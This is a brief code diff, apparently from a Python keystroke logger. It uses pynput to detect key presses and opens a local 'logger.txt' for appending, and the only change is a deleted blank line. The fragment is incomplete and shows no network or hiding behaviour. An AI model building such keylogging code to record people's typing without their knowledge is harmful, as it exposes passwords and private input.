@@ -3,7 +3,6 @@ from pynput import keyboard
 import calendar
 import time
 
-
 # detect keypress
 def on_press(key):
     f = open("logger.txt", "a")
